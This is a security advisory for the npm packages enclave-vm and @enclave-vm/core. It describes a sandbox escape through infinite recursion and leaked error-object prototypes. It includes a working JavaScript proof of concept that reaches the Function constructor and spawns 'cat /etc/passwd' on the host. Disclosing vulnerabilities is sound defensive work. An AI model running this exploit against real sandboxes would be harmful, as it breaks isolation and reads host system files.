# [M] Sandbox escape via infinite recursion and error objects

## Summary
Severity: Medium
Advisory: GHSA-x39w-8vm5-5m3p
CVE: CVE-2026-25533
CWE: CWE-835
Ecosystem: npm
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2026-02-05
Source: https://github.com/advisories/GHSA-x39w-8vm5-5m3p
Type: github-advisory

## Affected
- npm: `enclave-vm` — affected >=0
- npm: `@enclave-vm/core` — affected >=0 <2.10.1

## Details
**Note:** The npm package has moved to `@enclave-vm/core` (formerly `enclave-vm`).  
All fixed versions and guidance refer to `@enclave-vm/core`.

### Summary
The existing layers of security in enclave-vm are insufficient: The AST sanitization can be bypassed with dynamic property accesses, the hardening of the error objects does not cover the peculiar behavior or the vm module and the function constructor access prevention can be side-stepped by leveraging host object references.

### Details
There is a bug in Node.js (https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf) that makes the vm module leak host references inside the vm module in case of infinite recursion. An attacker can exploit these to escape the sandbox.

### PoC
The following on was tested on Node.js v24.12.0 and enclave-vm 2.7.0.

```js
import { Enclave } from 'enclave-vm';

// Create enclave with a tool handler
const enclave = new Enclave({
  timeout: 5000,
  maxToolCalls: 10,
  maxIterations: 1000,
  toolHandler: async (toolName, args) => {
    // Your tool execution logic
    return { success: true, data: `Called ${toolName}` };
  },
});

// Execute AgentScript code
const result = await enclave.run(`
let res = null, rootProt = null;
let a = () =>{
try {
  a();
} catch (e) {
  rootProt = e[["__proto__"]][["__proto__"]][["__proto__"]];
  res=e.stack
}
}
a();
rootProt[["foo"]] = rootProt[["toString"]][["constructor"]]  
rootProt[["foo"]]("let options = {file: 'cat', args: [null,'/etc/passwd'], envPairs: [], stdio: [{ type: 'pipe', readable: true, writable: false },{ type: 'pipe', readable: false, writable: true },{ type: 'pipe', readable: false, writable: true } ]}; console.log(process.binding('spawn_sync').spawn(options).output[1].toString())")();
`);

```
### Impact
Sandbox escape and potential other escalations on FrontMCP/AgentFront/other Frontegg products.

## References
- https://github.com/agentfront/enclave/security/advisories/GHSA-x39w-8vm5-5m3p
- https://nvd.nist.gov/vuln/detail/CVE-2026-25533
- https://github.com/agentfront/enclave/commit/2fcf5da81e7e2578ede6f94cae4f379165426dca
- https://github.com/agentfront/enclave
- https://www.staicu.org/publications/usenixSec2023-SandDriller.pdf
